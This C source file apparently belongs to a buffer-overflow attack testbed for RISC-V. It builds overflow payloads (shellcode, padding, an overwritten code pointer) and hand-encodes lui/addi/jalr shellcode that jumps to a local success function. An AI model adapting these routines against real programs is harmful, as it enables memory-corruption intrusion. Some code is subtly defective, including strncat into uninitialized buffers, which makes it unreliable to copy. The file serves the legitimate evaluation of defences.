#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <limits.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "payload.h"
#include "test_status.h"
#include "parameters.h"

#define JALR_HEX "000300e7"
#define BITS_PER_BYTE 8
#define INSTRUCTION_BIT_LENGTH 32
#define INSTRUCTION_BYTE_LENGTH (INSTRUCTION_BIT_LENGTH / BITS_PER_BYTE)
#define HEX_CHAR_LENGTH 8
#define LOW_BIT_COUNT 3
#define HIGH_BIT_COUNT 5

static bool output_debug_info = false;

bool
build_payload(ripe_payload_t *payload, ripe_attack_form_t attack, char *shellcode, size_t shellcode_length)
{
  size_t bytes_to_pad;
  char *temp_char_buffer;
  char *temp_char_ptr;

  payload->buffer = (char *) malloc(payload->size);
  if (payload->buffer == NULL) {
    print_line("Unable to allocate memory for payload buffer");
    return false;
  }

  switch (attack.inject_param) {
    case INJECTED_CODE_NO_NOP:
      if (payload->size < (shellcode_length + sizeof(uintptr_t))) {
        return false;
      }
      memcpy(payload->buffer, shellcode, shellcode_length);
      break;
    case DATA_ONLY:
      if (attack.code_ptr == VAR_IOF) {
        payload->size = 256 + sizeof(uintptr_t) + sizeof(char);
      }

      if (attack.code_ptr == VAR_LEAK) {
        payload->size += 32 - sizeof(uintptr_t);
        payload->buffer[0] = payload->size & 0xFF;
        payload->buffer[1] = payload->size / 0x100;
        payload->buffer[2] = 'A';
        payload->buffer[3] = '\0';
        payload->size = 4;
        return true;
      }
    case RETURN_ORIENTED_PROGRAMMING:
    case RETURN_INTO_LIBC:
      if (payload->size < sizeof(uintptr_t)) {
        return false;
      }

      shellcode_length = 0;
      shellcode = "dummy";
      break;
  }

  /* size - shellcode - target address - null terminator */
  bytes_to_pad =
    (payload->size - shellcode_length - sizeof(uintptr_t) - 1);

  memset((payload->buffer + shellcode_length), 'A', bytes_to_pad);

  print_debug("bytes to pad: %d", bytes_to_pad);
  print_debug("overflow_ptr: %p", payload->overflow_ptr);

  if (attack.code_ptr != VAR_IOF) {
    memcpy(&(payload->buffer[shellcode_length + bytes_to_pad]),
        &payload->overflow_ptr,
        sizeof(uintptr_t));
  }

  payload->buffer[payload->size - 1] = '\0';

  print_debug("payload == %s", payload->buffer);
  return true;
}

static const char *hex_to_binary(char c) {
  const char *binary_strings[] = {
    "0000", "0001", "0010", "0011",
    "0100", "0101", "0110", "0111",
    "1000", "1001", "1010", "1011",
    "1100", "1101", "1110", "1111"};

	if (c >= '0' && c <= '9') return binary_strings[c - '0'];
	if (c >= 'a' && c <= 'f') return binary_strings[10 + c - 'a'];
	return NULL;
}

static void
hex_to_string(char *string, uintptr_t value)
{
  snprintf(string, HEX_CHAR_LENGTH + 1, "%8x", value);

  for (int i = 0; i <= HEX_CHAR_LENGTH; i++) {
    if (string[i] == ' ') string[i] = '0';
  }
}

static void
format_instruction(char * destination, size_t instruction)
{
  char instruction_bytes[INSTRUCTION_BYTE_LENGTH];
  ssize_t i;

  for(i = 0; i < INSTRUCTION_BYTE_LENGTH; i++) {
    instruction_bytes[i] = (instruction >> ((INSTRUCTION_BYTE_LENGTH - i - 1) * BITS_PER_BYTE)) & 0xff;
  }

  for (i = 3; i >= 0; i--) {
    destination[3 - i] = instruction_bytes[i];
  }
}

static void
shellcode_target()
{
  print_line("success.\nCode injection function reached.");
  test_pass();
  test_done();
  exit(0);
}

void
build_shellcode(char * shellcode)
{
  char attack_address[HEX_CHAR_LENGTH + 1];
  char low_bits[LOW_BIT_COUNT + 1];
  char high_bits[HIGH_BIT_COUNT + 1];
  char lui_binary[INSTRUCTION_BIT_LENGTH + 1];
  char addi_binary[INSTRUCTION_BIT_LENGTH + 1];
  char lui_hex[HEX_CHAR_LENGTH + 1];
  char addi_hex[HEX_CHAR_LENGTH + 1];
  char *jalr_hex = JALR_HEX;
  size_t lui_raw_bits, addi_raw_bits, jalr_raw_bits;

  // fix shellcode when lower bits become negative
  if (((uintptr_t)&shellcode_target & 0x00000fff) >= 0x800) {
    hex_to_string(attack_address, (uintptr_t)(&shellcode_target + 0x1000));
  }
  else {
    hex_to_string(attack_address, (uintptr_t)&shellcode_target);
  }

  // split attack address into low and high bit strings
  strncpy(low_bits, &attack_address[5], 3);
  strncpy(high_bits, attack_address, 5);

  jalr_raw_bits = strtoul(jalr_hex, 0, 16);

  // generate 20 imm bits for the LUI instruction
  for (int i = 0; i < 5; i++) {
    strncat(lui_binary, hex_to_binary(high_bits[i]), 4);
  }

  // append reg and opcode bits, then convert to raw binary
  strncat(lui_binary, "001100110111", 12);
  lui_raw_bits = strtoul(lui_binary, 0, 2);

  hex_to_string(lui_hex, lui_raw_bits);

  // generate binary for ADDI instruction
  for (int i = 0; i < 3; i++) {
    strncat(addi_binary, hex_to_binary(low_bits[i]), 4);
  }

  strncat(addi_binary, "00110000001100010011", 20);
  addi_raw_bits = strtoul(addi_binary, 0, 2);

  hex_to_string(addi_hex, addi_raw_bits);

  format_instruction(shellcode, lui_raw_bits);
  format_instruction(shellcode + 4, addi_raw_bits);
  format_instruction(shellcode + 8, jalr_raw_bits);

  hex_to_string(lui_hex, lui_raw_bits);
  hex_to_string(addi_hex, addi_raw_bits);

  if (output_debug_info == true) {
    printf("----------------\nShellcode instructions:\n");
    printf("%s0x%-20s%14s\n", "lui t1,  ", high_bits, lui_hex);
    printf("%s0x%-20s%10s\n", "addi t1, t1, ", low_bits, addi_hex);
    printf("%s%38s\n----------------\n", "jalr t1", jalr_hex);
  }
}
